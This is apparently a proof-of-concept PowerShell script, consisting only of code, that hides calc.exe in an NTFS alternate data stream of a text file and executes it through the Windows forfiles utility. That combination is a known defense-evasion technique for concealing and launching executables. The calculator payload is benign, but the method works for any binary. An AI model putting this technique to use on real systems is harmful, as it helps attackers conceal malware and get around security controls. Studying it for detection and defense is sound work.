$exefilepath = "C:\Windows\System32\calc.exe"
$mercyfilepath = "C:\testing\calc.txt"
$streamname = "calc.exe"

# to load the file into a stream
$cmdCommandString = "type `"$exefilepath`" > `"$mercyfilepath`:$streamname`""

# to execute
$executeCommandString = "forfiles /P C:\windows\system32 /m notepad.exe /c `"`"${mercyfilepath}:${streamname}`"`""
cmd.exe /c $cmdCommandString
cmd.exe /c $executeCommandString

